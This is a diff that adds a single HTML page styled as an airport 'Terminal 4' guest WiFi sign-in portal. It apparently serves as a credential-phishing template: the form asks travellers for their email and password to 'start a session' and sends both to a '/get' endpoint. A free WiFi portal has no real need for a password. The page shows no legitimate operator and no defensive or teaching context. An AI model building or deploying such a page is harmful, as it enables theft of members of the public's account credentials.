@@ -1,0 +1,32 @@
+<!doctype html><html><head>
+<meta name="viewport" content="width=device-width,initial-scale=1"><title>Terminal WiFi</title>
+<style>
+ body{font-family:-apple-system,Segoe UI,Arial,sans-serif;background:#0b1c33;color:#fff;
+      min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0}
+ .wrap{width:340px}
+ .logo{font-size:13px;letter-spacing:.28em;text-transform:uppercase;color:#7fb2ff;margin-bottom:22px}
+ .card{background:#fff;color:#111;padding:30px 26px;border-radius:12px;box-shadow:0 12px 40px rgba(0,0,0,.5)}
+ h1{font-size:19px;margin:0 0 4px}p{color:#5a6572;font-size:13px;margin:0 0 18px}
+ label{display:block;font-size:11px;text-transform:uppercase;letter-spacing:.08em;color:#8a94a3;margin-top:12px}
+ input{width:100%;padding:11px;margin-top:5px;border:1px solid #cfd6de;border-radius:6px;
+       box-sizing:border-box;font-size:15px}
+ button{width:100%;padding:12px;margin-top:18px;background:#0b1c33;color:#fff;border:0;
+        border-radius:6px;font-size:15px;letter-spacing:.03em}
+ .fine{font-size:11px;color:#9aa4b1;margin-top:16px;text-align:center}
+</style></head><body>
+<div class="wrap">
+  <div class="logo">Terminal 4 · Guest Network</div>
+  <div class="card">
+    <h1>Complimentary WiFi</h1>
+    <p>Sign in with your email to start your session</p>
+    <form action="/get" method="GET">
+      <label>Email</label>
+      <input name="email" type="email" placeholder="you@example.com" required>
+      <label>Password</label>
+      <input name="password" type="password" placeholder="Password" required>
+      <button type="submit">Start session</button>
+    </form>
+    <div class="fine">Sessions end after 60 minutes of inactivity</div>
+  </div>
+</div>
+</body></html>
